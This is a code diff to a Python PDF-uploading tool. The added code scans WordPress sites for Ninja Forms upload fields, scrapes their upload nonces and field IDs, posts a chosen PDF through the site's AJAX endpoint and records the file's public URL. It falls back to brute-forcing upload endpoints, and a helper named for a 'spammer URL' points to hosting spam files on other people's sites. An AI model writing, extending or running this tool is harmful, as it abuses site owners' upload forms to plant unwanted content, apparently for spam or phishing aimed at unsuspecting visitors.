@@ -2333,7 +2333,6 @@ class PdfUploader:
             return None
 
         b64data = base64.b64encode(file_bytes).decode()
-        # Build JS to create FormData and POST via fetch
         extra_js = ''
         if extra_fields:
             for k, v in extra_fields.items():
@@ -2362,6 +2361,139 @@ class PdfUploader:
             return json.loads(result_str)
         except Exception as e:
             return {'status': 0, 'body': str(e)}
+
+    def _browser_find_form_and_upload(self, site_root, plugin):
+        """Use browser to find a form page with file upload, extract nonce, upload."""
+        driver = self._driver if hasattr(self, '_driver') else None
+        if not driver:
+            return
+
+        # Common form page paths to check
+        form_paths = [
+            '/contact', '/contact-us', '/apply', '/get-involved', '/volunteer',
+            '/join', '/submit', '/upload', '/registration', '/register',
+            '/careers', '/scholarship', '/application', '/enrollment',
+            '/inquiry', '/request', '/feedback', '/support',
+        ]
+
+        # Find a page with the plugin's file upload field
+        form_url = None
+        for path in form_paths:
+            try:
+                driver.get(site_root + path)
+                time.sleep(2)
+                src = driver.page_source
+                # Check for file upload input from this plugin
+                has_file = ('type="file"' in src or "type='file'" in src or
+                            'nf-fu' in src or 'file_upload' in src.lower())
+                if has_file and plugin.replace('-', '') in src.replace('-', '').lower():
+                    form_url = site_root + path
+                    break
+            except Exception:
+                continue
+
+        if not form_url:
+            # Also check links from homepage
+            try:
+                driver.get(site_root)
+                time.sleep(2)
+                links = driver.execute_script('''
+                    return [...document.querySelectorAll('a[href]')]
+                        .map(a => a.href)
+                        .filter(h => h.includes(arguments[0]) && !h.includes('#'))
+                        .slice(0, 30);
+                ''', site_root)
+                for link in links:
+                    if any(kw in link.lower() for kw in ['form', 'apply', 'contact', 'upload', 'submit']):
+                        driver.get(link)
+                        time.sleep(2)
+                        src = driver.page_source
+                        if 'type="file"' in src or 'nf-fu' in src:
+                            form_url = link
+                            break
+            except Exception:
+                pass
+
+        if not form_url:
+            return
+
+        # We're on the form page — extract upload nonce + field info
+        src = driver.page_source
+
+        # Ninja Forms specific
+        if 'ninja' in plugin.lower() or 'nf-' in src:
+            self._nf_browser_upload(driver, site_root, src)
+
+    def _nf_browser_upload(self, driver, site_root, page_src):
+        """Ninja Forms specific: extract nonce + field_id, upload via AJAX."""
+        import re as _re
+
+        # Find upload nonce
+        nonce_match = _re.search(r'nf-upload-nonce.*?value="([a-f0-9]+)"', page_src)
+        if not nonce_match:
+            return
+        nonce = nonce_match.group(1)
+
+        # Find file upload field ID (e.g., files-96)
+        field_match = _re.search(r'name="files-(\d+)\[\]".*?type="file"', page_src)
+        if not field_match:
+            # Try reverse order
+            field_match = _re.search(r'type="file".*?name="files-(\d+)', page_src)
+        if not field_match:
+            # Search in containers
+            field_match = _re.search(r'file_upload-container.*?id="nf-field-(\d+)"', page_src)
+        if not field_match:
+            return
+        field_id = field_match.group(1)
+
+        # Find form ID
+        form_match = _re.search(r"form\.id='(\d+)'", page_src)
+        form_id = form_match.group(1) if form_match else '1'
+
+        b64data = base64.b64encode(self.pdf_bytes).decode()
+
+        result = driver.execute_script(f"""
+        return await (async () => {{
+            try {{
+                const raw = atob('{b64data}');
+                const arr = new Uint8Array(raw.length);
+                for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+                const blob = new Blob([arr], {{type: 'application/pdf'}});
+                const fd = new FormData();
+                fd.append('files-{field_id}', blob, '{self.pdf_filename}');
+                fd.append('action', 'nf_fu_upload');
+                fd.append('field_id', '{field_id}');
+                fd.append('nonce', '{nonce}');
+                fd.append('form_id', '{form_id}');
+                const resp = await fetch('/wp-admin/admin-ajax.php', {{method: 'POST', body: fd}});
+                const text = await resp.text();
+                return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
+            }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
+        }})();
+        """)
+
+        try:
+            res = json.loads(result)
+        except Exception:
+            res = {'status': 0, 'body': result or 'parse error'}
+
+        resp_text = res.get('body', '')
+        status = res.get('status', 0)
+        success = status == 200 and 'tmp_name' in resp_text and '"errors":[]' in resp_text
+
+        # Extract the uploaded file info
+        upload_url = ''
+        if success:
+            # The file is at /wp-content/uploads/ninja-forms/{form_id}/{filename}
+            upload_url = f"{site_root}/wp-content/uploads/ninja-forms/{form_id}/{self.pdf_filename}"
+
+        self.techniques.append({
+            'name': f'Ninja Forms Browser Upload (field={field_id}, form={form_id})',
+            'http_status': status,
+            'success': success,
+            'response_snippet': resp_text[:500],
+            'upload_url': upload_url,
+        })
 
     def _multipart_body(self, field_name, filename, content_type, file_bytes, extra_fields=None):
         """Build multipart/form-data. Returns (body_bytes, content_type_header)."""
@@ -2690,6 +2822,14 @@ class PdfUploader:
         if not driver:
             return
 
+        # First: try the smart approach — find form page, extract nonce, upload properly
+        info = self._parse_spammer_url()
+        self._browser_find_form_and_upload(info['site_root'], info['plugin'])
+        # Check if it worked
+        if any(t['success'] for t in self.techniques):
+            return
+
+        # Fallback: brute-force endpoints through browser fetch
         base_name = self.pdf_filename.rsplit('.', 1)[0] if '.' in self.pdf_filename else self.pdf_filename
         tried = 0
 
